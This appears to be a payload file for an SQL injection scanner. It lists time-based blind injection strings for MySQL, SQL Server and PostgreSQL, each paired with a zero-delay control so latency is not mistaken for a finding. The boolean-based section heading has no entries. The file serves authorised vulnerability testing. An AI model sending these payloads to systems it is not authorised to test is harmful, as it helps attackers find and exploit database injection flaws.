# --- Boolean-based: paired true/false conditions for differential analysis ---

# --- Time-based: deliberate delay payloads per DB engine ---
# Each is paired with the "time_control" baseline payload to rule out
# ordinary network/server latency before calling it a finding.
time|' AND SLEEP(5)--
time|' OR SLEEP(5)--
time|'; WAITFOR DELAY '0:0:5'--
time|' AND pg_sleep(5)--
time|' || pg_sleep(5)--

# time_control payloads must be syntactically identical in shape to the
# time payloads above but with a 0-second delay, so the only difference
# being measured is the delay amount itself, not the payload structure.
time_control|' AND SLEEP(0)--
time_control|' OR SLEEP(0)--
time_control|'; WAITFOR DELAY '0:0:0'--
time_control|' AND pg_sleep(0)--
time_control|' || pg_sleep(0)--
